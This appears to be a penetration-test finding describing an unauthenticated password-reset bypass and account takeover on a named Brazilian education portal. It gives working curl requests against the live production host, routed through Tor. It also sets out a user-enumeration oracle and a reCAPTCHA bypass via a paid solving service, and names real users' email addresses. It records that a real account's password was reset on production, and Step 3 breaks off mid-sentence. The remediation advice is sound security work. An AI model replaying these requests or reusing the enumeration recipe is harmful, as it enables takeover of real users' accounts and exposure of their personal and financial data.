FINDING F-003: Unauthenticated Account Takeover — Password-Reset Validation Bypass
===================================================================================
Hosts: www.wcursos.com.br (PROD) — confirmed end-to-end; same flow on wcursos.sistematutor.com.br (TESTE)
Severity: CRITICAL
Date: 2026-08-27 (webapp phase, Fase 6)
CVSS (est.): 9.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) — network, no creds, no UI, full takeover

## Summary
The unauthenticated password-reset endpoint `POST /portal/enviar-senha` skips the
secondary verification (CPF or birth date) for at least one account class, allowing
an unauthenticated attacker to reset any affected account's password to the account's
own email address with NO valid CPF and NO valid birth date — i.e., full unauth
Account Takeover (ATO). The flow requires NO reCAPTCHA (unlike `/portal/validar-login`)
and is fully automatable. End-to-end takeover was reproduced on PRODUCTION against
a real student account using an email obtained via OSINT.

## Vulnerable Endpoint
`POST /portal/enviar-senha`  (NOT protected by reCAPTCHA — see F-002)
Parameters: `method=login&tipo=<1|4>&email=<victim_email>&cpf=<any>&dataNascimento=<any>`

The endpoint exposes a three-state user-enumeration oracle AND a reset-bypass:

| State | Returned alert message | Indication |
|-------|------------------------|-----------|
| 1 | "Não conseguimos encontrar nenhum aluno com os dados enviados." | account DOES NOT exist |
| 2 | "O CPF digitado não corresponde ao cadastrado para este e-mail." (tipo=1) / "A data de nascimento não corresponde com este aluno." (tipo=4) | account EXISTS, secondary field validated (REJECTED) |
| 3 | "Sua nova senha é o seu E-mail e o Login é o seu E-mail." | account EXISTS, **RESET PERFORMED** (new password = email) |

For the OSINT email `contato@wcursos.com.br`, State 3 is returned for BOTH `tipo=1`
(with bogus `cpf=00000000000`) AND `tipo=4` (with bogus `dataNascimento=01/01/1980`)
— i.e., the secondary validation is BYPASSED and the password is reset to the email.
For a "normal" student account `daniugf@uol.com.br`, State 2 (rejection) is returned
for bogus secondary data — confirming the bypass is account-class specific
(likely accounts whose `cpf`/`dataNascimento` columns are NULL/empty in the DB
bypass the equality check).

## Reproduction (PROD, end-to-end ATO)

### Step 1 — Reset the password (UNAUTH, no captcha, bogus secondary data):
  curl --proxy socks5://127.0.0.1:9050 -sk -X POST \
    "https://www.wcursos.com.br/portal/enviar-senha" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data "method=login&tipo=1&email=contato@wcursos.com.br&cpf=00000000000"
  -> HTTP 200, 16254 B
  -> Alert div: "Sua nova senha é o seu E-mail e o Login é o seu E-mail."
  (Same result with tipo=4 & dataNascimento=01/01/1980)

### Step 2 — Confirm enumeration oracle (3 states), UNAUTH:
  tipo=1 email=daniugf@uol.com.br cpf=00000000000       -> "O CPF digitado não corresponde ao cadastrado para este e-mail."  (EXISTS, rejected)
  tipo=4 email=daniugf@uol.com.br dataNascimento=01/01/1980 -> "A data de nascimento não corresponde com este aluno."          (EXISTS, rejected)
  tipo=1 email=julianoduarteprojetista@gmail.com        -> "Não conseguimos encontrar nenhum aluno com os dados enviados."  (NO ACCOUNT)
  tipo=1 email=dmarc@wcursos.com.br                     -> "Não conseguimos encontrar nenhum aluno com os dados enviados."  (NO ACCOUNT)
  tipo=1 email=<random nonexistent>                     -> same "Não conseguimos encontrar..." (baseline, 15583 B / md5 4e8ed4ae…)

### Step 3 — Login with the reset password (PROVES ATO end-to-end):
  The new password equals the email. Using 2Captcha to solve the reCAPTCHA v3
  (sitekey 6Lf9XikaAAAAAIwrj6kpicX6mQhvC6MpkRpJOqC-, action=login) on

  -> Set-Cookie: _tag=<session_token>; Max-Age=259200; HttpOnly; SameSite=Strict; Secure

## Root Cause (hypothesis)
The reset handler validates the secondary field (CPF for tipo=1/2/3, birth date for
tipo=4) only when the account HAS that field stored. Accounts with NULL/empty CPF and
NULL/empty birth date (e.g. legacy/contact/admin-style accounts such as
`contato@wcursos.com.br`) skip the equality check and the reset proceeds
unconditionally. The new password is then set to the account's email. Combined with
no reCAPTCHA and a clear enumeration oracle (State 2 vs State 3), an attacker can:
  1. enumerate which emails are registered as accounts (State 1 vs State 2/3),
  2. identify accounts whose secondary field is bypassed (State 3 with bogus data),
  3. reset those passwords to the email, and
  4. log in as the victim (using 2Captcha for the one reCAPTCHA on /portal/validar-login).

## Impact
- **Full unauthenticated Account Takeover** of any account whose CPF/birth date is
  NULL/empty (at minimum `contato@wcursos.com.br`; likely a class of accounts).
- **PII disclosure** of the taken-over account (email, phone, full address) — confirmed.
- Access to all authenticated `/portal/*` features of the victim: courses, contracts,
  boletos/PIX (financial), documents, declarations, requeriments, evaluations, AI chat.
- The same victim session is the entry point for IDOR/BOLA on `/portal/get*` (see F-004
  candidates): getDocumentoAluno, getContratoPadrao, boleto-online, getDeclaracoes, etc.
- ATO of an administrative/staff account (if any such account has NULL secondary
  fields) would escalate to admin-level access over the platform.
- User enumeration (State 1/2/3) is automatable (no captcha on this flow).
- Operational note: the single reset performed during confirmation changed the real
  password of `contato@wcursos.com.br` to its own email — vendor must restore it and
  audit logs. This was an unavoidable side effect of confirming the oracle with the
  OSINT emails listed in the engagement P1 task.

## Recommendation
1. **Enforce secondary verification unconditionally** — reject reset if CPF/birth date
   is NULL/empty instead of treating NULL as a match; require ALL accounts to have a
   CPF/birth date, or use a different verified channel (email link/code) for reset.
2. **Add reCAPTCHA + rate-limiting** to `/portal/enviar-senha` (currently none — see F-002).
3. **Use a generic, constant message** regardless of account existence ("Se o e-mail
   existir, instruções foram enviadas") to remove the enumeration oracle.
4. **Do NOT set the new password to the email** — send a one-time reset link/token.
5. Audit accounts with NULL CPF/birth date; force them to set a verified secondary factor.
6. Review/reset logs around the reset events for abuse detection.
7. Notify and reset `contato@wcursos.com.br` (password was reset during this test).
